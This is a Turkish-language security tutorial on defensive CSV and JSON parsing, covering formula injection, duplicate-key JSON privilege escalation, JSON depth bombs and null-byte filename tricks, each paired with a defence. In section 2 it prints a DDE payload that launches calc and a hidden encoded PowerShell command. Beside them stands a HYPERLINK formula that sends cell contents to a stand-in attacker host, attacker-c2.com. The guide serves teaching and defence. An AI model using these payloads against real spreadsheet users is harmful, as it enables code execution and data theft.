# GÜN 079: CSV VE JSON VERİ İŞLEME — SAVUNMACI AYRIŞTIRMA VE GÜVENLİK REHBERİ
# ÖZEL LİSANS — TÜM HAKLAR SAKLIDIR
# Telif Hakkı (c) 2026 Seydi Eryılmaz (@seydivakkas)
# Bu yazılım ve ilgili tüm dosyalar ("Yazılım") yalnızca görüntüleme ve eğitim amaçlı olarak paylaşılmıştır.
# YASAKLAR: Kopyalanamaz, çoğaltılamaz, dağıtılamaz, değiştirilemez, satılamaz, tersine mühendislik yapılamaz.
# İZİN VERİLEN KULLANIM: GitHub üzerinde görüntüleme ve inceleme (kopyalamadan).
# YAZARIN AÇIK YAZILI İZNİ OLMAKSIZIN HİÇBİR KULLANIM HAKKI TANINMAZ.

---

## 1. USTANIN GİRİŞİ: VERİ DEĞİŞİM FORMATLARININ GÖRÜNMEYEN TUZAKLARI

Evladım, siber güvenlik operasyonlarında (SOC, CERT/CSIRT, tehdit istihbaratı ve adli bilişim) veri hiçbir zaman saf veya güvenilir biçimde kapına gelmez. Dış dünyadan toplanan telemetri kayıtları, zafiyet tarama çıktıları, IoC (Indicator of Compromise) listeleri ve güvenlik duvarı olayları ağırlıklı olarak iki metin tabanlı formatta akar: **CSV (Comma-Separated Values)** ve **JSON (JavaScript Object Notation)**.

Acemi bir yazılımcı veya siber güvenlik analisti, bu formatları yalnızca "ayrıştır ve veritabanına yaz" seviyesinde görür. Standart kütüphaneyi çağırır; `csv.reader` veya `json.loads` der, geçer. Ancak bir usta bilir ki; enjeksiyon saldırılarının ve bellek tükenmesi (Denial of Service - DoS) tuzaklarının en tehlikelileri bu veri taşıma protokollerinin yapısal zafiyetlerinde gizlidir.

Bugünkü dersimizde; CSV dosyalarındaki **Formül Enjeksiyonu (CWE-1236 / DDE Execution)**, sütun tutarsızlıkları ve tampon aşımı tehditleri ile JSON ayrıştırmasındaki **Mükerrer Anahtar Çarpışması (JSON Hijacking / Parser Differential)**, **JSON Bombası (Derin Özyinelemeli DoS)** ve **Null-Byte Zehirlenmesi** mekanizmalarını derinlemesine inceleyecek, her birini savunmacı kodlama kalıplarıyla etkisiz hale getireceğiz.

---

## 2. CSV FORMATI VE FORMÜL ENJEKSİYONU (CWE-1236)

### 2.1. Saldırının Doğası: CSV Nasıl Zararlı Kod Yürütür?
CSV, görünüşte düz metin (plain text) ve virgülle ayrılmış sütunlardan ibarettir. Kendi başına bir çalıştırma motoru (execution engine) barındırmaz. Ancak güvenlik raporları, müşteri logları veya tehdit listeleri analistler ve yöneticiler tarafından **Microsoft Excel**, **LibreOffice Calc** veya **Google Sheets** gibi elektronik tablo yazılımlarında açılır.

İşte zafiyet burada başlar:
Elektronik tablo programları, bir hücrenin içeriği belirli karakterlerle başladığında o hücreyi metin değil, bir **hesaplama formülü veya harici komut tetikleyicisi** olarak yorumlar.

Tehlikeli tetikleyici karakterler:
- `=` (Eşittir: Standart formül ve DDE komut yürütme)
- `+` (Artı: Toplama formülü veya formül sarmalayıcı)
- `-` (Eksi: Çıkarma formülü veya formül sarmalayıcı)
- `@` (Et işareti: Fonksiyon çağrı tetikleyicisi)
- `\t` (Tab: Hücre sınırını bozucu gizli tetikleyici)
- `\r` (Satır başı: Hücre ayırıcı atlatma)

### 2.2. DDE (Dynamic Data Exchange) ile Uzaktan Kod Çalıştırma
Saldırgan, bir web sitesindeki kullanıcı adı alanına veya bir güvenlik günlüğüne şu girdiyi enjekte eder:
```csv
id,username,role
1,=cmd|'/C calc'!A0,Administrator
```
Bu dosya bir analist tarafından Excel'de açıldığında, Excel DDE protokolü üzerinden Windows komut satırını (`cmd.exe`) çağırır ve hesap makinesini (`calc.exe`) ya da daha tehlikelisi arka planda bir Powershell ters kabuk (reverse shell) betiğini çalıştırır:
```csv
=cmd|'/C powershell -w hidden -enc JABjAGwAaQBlAG4AdAAgAD0A...'!A0
```

### 2.3. Veri Sızdırma (Data Exfiltration via HYPERLINK)
Saldırgan harici komut çalıştırmasa dahi, tablodaki diğer hassas verileri (örneğin kurbanın IP'sini veya diğer hücreleri) dışarı sızdırabilir:
```csv
2,+HYPERLINK("https://attacker-c2.com/leak?data="&A1&"_"&B1,"Görüntüle")
```
Kullanıcı hücreye tıkladığı anda hücrelerdeki hassas veriler saldırganın C2 sunucusuna HTTP GET isteğiyle taşınır.

### 2.4. Ustanın Savunma Reçetesi: Hücre Nötralizasyonu
CSV üretirken veya dışarı aktarırken yapılması gereken katı savunma:
1. Hücre dize değerinin solundaki boşluklar kırpılır (`lstrip()`).
2. İlk karakter `=` , `+` , `-` , `@` , `\t` veya `\r` ile başlıyorsa, değerin en başına **tek tırnak (`'`)** eklenir.
3. Tek tırnak (`'`), elektronik tablo yazılımlarına "Bu hücreyi asla formül olarak işleme, düz metin (verbatim text) olarak göster" emrini verir.

---

## 3. CSV PARSER BOZULMASI VE BELLEK TAŞMASI (DoS)

### 3.1. Sütun Sayısı Uyumsuzluğu
CSV formatında başlık satırındaki sütun sayısı, dosyadaki her bir veri satırının sütun sayısına tam olarak eşit olmak zorundadır:
```csv
col1,col2,col3
val1,val2
val1,val2,val3,val4
```
Kötü yapılandırılmış veya kaçış karakteri (escaping) eksik olan alanlar, sonraki sütunların kaymasına ve güvenlik süzgeçlerinin devre dışı kalmasına neden olur. Savunmacı ayrıştırıcı, her satırda `len(row) == len(headers)` denetimini katı (`strict`) şekilde yapmalı, tutarsızlıkta işlemi durdurmalıdır.

### 3.2. Aşırı Büyük Hücre Boyutu (Oversized Field DoS)
Python'un `csv` modülü standart olarak 128 KB (`131072` bayt) alan sınırına sahiptir. Ancak saldırganlar tek bir hücreye megabaytlarca veri koyarak ayrıştırma motorunun RAM'ini tüketmeye çalışır. İşlemci düzeyinde `max_field_size_bytes` (örneğin 64 KB) ve `max_rows` (örneğin 50.000 satır) tavan sınırları zorunlu kılınmalıdır.

---

## 4. JSON VE MODERN GÜVENLİK ZAFİYETLERİ

JSON, modern mikroservislerin ve REST API'lerin omurgasıdır. Ancak esnekliği, beraberinde ciddi güvenlik riskleri getirir.

### 4.1. Mükerrer Anahtar Çarpışması (Duplicate Key Collision / JSON Hijacking)
RFC 8259 standartlarına göre, bir JSON nesnesindeki anahtarların benzersiz (unique) olması **önerilir**, ancak ayrıştırıcıların mükerrer anahtarları nasıl ele alacağı katı olarak dikte edilmemiştir.
Örnek saldırı yükü:
```json
{
  "role": "user",
  "threat_score": 10,
  "role": "admin"
}
```
**Parser Differential Tehlikesi:**
- Bir WAF (Web Application Firewall) veya yetkilendirme modülü ilk anahtarı okuyup `"role": "user"` görebilir ve isteğe izin verebilir.
- Arkadaki Python uygulaması `json.loads` kullandığında varsayılan davranış gereği **son anahtarı** kabul eder ve kullanıcının rolünü `"admin"` yapar!
- Bu durum doğrudan **Yetki Yükseltme (Privilege Escalation)** zafiyetidir.

**Savunma:**
Python `json.loads` fonksiyonuna özel `object_pairs_hook` parametresi verilerek, aynı anahtar sözlükte ikinci kez görüldüğü anda `ValueError` fırlatılmalı ve istek reddedilmelidir.

### 4.2. JSON Bombası (Deep Recursion / Stack Overflow DoS)
Saldırgan, aşırı derecede iç içe geçmiş JSON yapıları gönderir:
```json
{"a": {"a": {"a": {"a": ... {"a": "bomb"} ... }}}}
```
Ayrıştırıcı bu yapıyı belleğe açarken veya arkasından gelen serializer özyinelemeli fonksiyon çağrıları yaparken Python'un çağrı yığını tavanına (`sys.getrecursionlimit()`) çarpar ve sistem çöker.
**Savunma:**
JSON yükü ayrıştırılırken özyinelemeli yapı denetimi yapılmalı ve belirlenen derinlik tavanı (`max_depth = 15`) aşıldığında işlem kesilmelidir.

### 4.3. Null-Byte (`\x00`) Zehirlenmesi
JSON içindeki dize alanlarına `\u0000` yerleştirilerek dosya uzantıları, veritabanı sorguları veya C tabanlı alt sistemler yanıltılabilir:
```json
{"filename": "guvenli_rapor.pdf\u0000.exe"}
```
Tüm dize alanları taranmalı ve null-byte içeren değerler anında reddedilmelidir.

### 4.4. Katı Şema ve Tip Doğrulaması
JSON dinamik tipli olduğundan, `threat_score` beklenen bir alana string (`"99"` veya `"high"`) ya da liste (`[1, 2]`) gönderilebilir. Uygulama kodunda tip hatası (TypeError / AttributeError) oluşmaması için, her JSON girdisi işlenmeden önce zorunlu alanlar ve tipler doğrulanmalıdır.

---

## 5. MİMARİ VE UYGULAMA YAPISI

G079 kapsamında geliştirilen `SecureCsvProcessor`, `SecureJsonProcessor` ve `SecurityDataIngestionEngine` sınıfları şu mimariyi sunar:

```
                      +-----------------------------+
                      |   GELEN TEHDİT VERİ AKIŞI   |
                      +-----------------------------+
                                     |
                    +----------------+----------------+
                    |                                 |
                    v                                 v
        [ SecureCsvProcessor ]              [ SecureJsonProcessor ]
        - Formula Neutralization            - Duplicate Key Hook
        - Strict Column Validation          - Depth Recursion Limit
        - Max Field Size Guard              - Null-Byte Scanner
        - Null-Byte Detection               - Schema Validator
                    |                                 |
                    +----------------+----------------+
                                     |
                                     v
                    [ SecurityDataIngestionEngine ]
                    - Façade Tasarım Kalıbı
                    - Kritik Tehdit Filtreleme
                    - Adli Denetim Raporu
```

---

## 6. ÖZET VE USTADAN ÇIRAĞA TAVSİYELER

1. **Girdiye Asla Güvenme:** CSV veya JSON olması fark etmez; metin olarak gelen her veriyi potansiyel bir saldırı vektörü olarak gör.
2. **Kütüphanenin Varsayılan Davranışına Güvenme:** Python'un `json.loads()` fonksiyonu mükerrer anahtarları sessizce ezer. Güvenlik kritik sistemlerde katı kancalar (`object_pairs_hook`) kullan.
3. **Excel'i Düşman Toprağı Kabul Et:** CSV ürettiğin her an, bu dosyanın Excel'de açılacağını ve formül enjeksiyonu riski taşıdığını hatırla; tehlikeli karakterlerin başına tek tırnak koy.
4. **Tavan Sınırları Belirle:** Boyut, satır sayısı ve derinlik sınırları olmayan her sistem, DoS saldırılarına karşı savunmasızdır.
